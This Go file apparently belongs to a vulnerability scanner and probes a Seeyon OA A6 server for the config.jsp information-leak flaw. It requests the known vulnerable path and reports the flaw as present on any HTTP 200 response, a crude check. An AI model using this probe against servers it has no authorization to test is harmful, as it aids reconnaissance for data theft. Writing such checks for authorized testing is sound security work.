package A6_config_leakage

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/yyoa/ext/trafaxserver/SystemManage/config.jsp"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	致远OA A6 config.jsp 敏感信息泄漏漏洞不存在")
		return
	}

	if resp.StatusCode == 200 {
		color.Green.Println("[+]	致远OA A6 config.jsp 敏感信息泄漏漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-]	致远OA A6 config.jsp 敏感信息泄漏漏洞不存在")
	}
}
